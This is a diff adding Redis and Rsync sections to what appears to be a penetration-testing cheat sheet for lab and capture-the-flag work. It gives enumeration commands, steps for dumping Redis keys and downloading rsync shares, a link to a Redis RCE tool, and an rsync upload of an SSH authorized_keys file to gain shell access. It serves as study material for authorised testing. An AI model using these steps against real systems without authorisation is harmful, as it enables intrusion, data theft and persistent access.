@@ -394,6 +394,51 @@ searchsploit --exclude=dos -t apache 2.2.3
 msfconsole; > search apache 2.2.3
 ````
 ## redis port 6379
+- https://book.hacktricks.xyz/pentesting/6379-pentesting-redis
+- Enumeration
+````
+nmap --script redis-info -sV -p 6379 <IP>
+msf> use auxiliary/scanner/redis/redis_server
+````
+- Manual Enumeration
+- Redis is a text based protocol, you can just send the command in a socket and the returned values will be readable. Also remember that Redis can run using ssl/tls (but this is very weird).
+- In a regular Redis instance you can just connect using nc or you could also use redis-cli
+````
+nc -vn 10.10.10.10 6379
+redis-cli -h 10.10.10.10 # sudo apt-get install redis-tools
+````
+- Run the `info` first, it will either dump the `redis` instance or say `-NOAUTH Authentication required.`
+- Username / Password are stored in the `redis.conf` file by default
+````
+grep ^[^#] redis.conf
+config set requirepass p@ss$12E45.
+masteruser
+````
+- Get Connected 
+````
+nc 10.10.63.208 6379
+info
+<server reply>
+redis-cli -h 10.10.63.208
+10.10.63.208:6379> info
+NOAUTH Authentication required.
+10.10.63.208:6379> AUTH B65Hx562.....
+OK
+````
+- Authenticated Enumeration
+````
+Authenticated enumeration
+If the Redis instance is accepting anonymous connections or you found some valid credentials, you can start enumerating the service with the following commands:
+INFO
+[ ... Redis response with info ... ]
+client list
+[ ... Redis response with connected clients ... ]
+CONFIG GET *
+[ ... Get config ... ]
+````
+- Dumping Database
+- Inside Redis the databases are numbers starting from `0`. You can find if anyone is used in the output of the command info inside the "Keyspace" chunk:
+- ![alt text](https://gblobscdn.gitbook.com/assets%2F-L_2uGJGU7AVNRcqRvEi%2F-MCwrx6EQpaXH4dsxZl3%2F-MCxgtV3m0F2z4KAOOsB%2Fimage.png?)
 ````
 if value is of type string -> GET <key>
 if value is of type hash -> HGETALL <key>
@@ -405,14 +450,67 @@ if value is of type sorted sets -> ZRANGEBYSCORE <key> <min> <max>
 ````
 type <key>
 ````
+- redis RCE
+- https://github.com/Ridter/redis-rce
+## Rsync port 873
+- Basic information
+- rsync is a utility for efficiently transferring and synchronizing files between a computer and an external hard drive and across networked computers by comparing the modification timesand sizes of files.
+````
+nc -vn 127.0.0.1 873
+(UNKNOWN) [127.0.0.1] 873 (rsync) open
+@RSYNCD: 31.0        <--- You receive this banner with the version from the server
+@RSYNCD: 31.0        <--- Then you send the same info
+#list                <--- Then you ask the sever to list
+raidroot             <--- The server starts enumerating
+USBCopy        	
+NAS_Public     	
+_NAS_Recycle_TOSRAID	<--- Enumeration finished
+@RSYNCD: EXIT         <--- Sever closes the connection
 
 
+#Now lets try to enumerate "raidroot"
+nc -vn 127.0.0.1 873
+(UNKNOWN) [127.0.0.1] 873 (rsync) open
+@RSYNCD: 31.0
+@RSYNCD: 31.0
+raidroot
+@RSYNCD: AUTHREQD 7H6CqsHCPG06kRiFkKwD8g    <--- This means you need the password
+````
+- Enumerate shared folders
+- An rsync module is essentially a directory share. These modules can optionally be protected by a password. 
+- This options lists the available modules and, optionally, determines if the module requires a password to access:
+````
+nmap -sV --script "rsync-list-modules" -p <PORT> <IP>
+msf> use auxiliary/scanner/rsync/modules_list
 
-
-
-
-
-
+#Example using IPv6 and a different port
+rsync -av --list-only rsync://[dead:beef::250:56ff:feb9:e90a]:8730
+````
+- Manual Rsync
+- List a shared folder
+````
+rsync -av --list-only rsync:/10.10.232.5/shared_name
+````
+- Copy all files to your local machine via the following command:
+````
+rsync -av rsync://192.168.0.123:8730/shared_name ./rsyn_shared
+````
+- If you have credentials you can list/download a shared name using (the password will be prompted):
+````
+rsync -av --list-only rsync://username@192.168.0.123/shared_name
+rsync -av rsync://username@192.168.0.123:8730/shared_name ./rsyn_shared
+````
+- You could also upload some content using rsync (for example, in this case we can upload an authorized_keys file to obtain access to the box):
+````
+rsync -av home_user/.ssh/ rsync://username@192.168.0.123/home_user/.ssh
+#full command syntax below
+rsync -av id_rsa.pub rsync://rsync-connect@10.10.63.208/files/sys-internal/.ssh/authorized_keys
+````
+- Find the rsyncd configuration file:
+````
+find /etc \( -name rsyncd.conf -o -name rsyncd.secrets \)
+````
+- Inside the config file sometimes you could find the parameter `secrets file = /path/to/file` and this file could contains usernames and passwords allowed to authenticate to rsyncd.
 
 
 
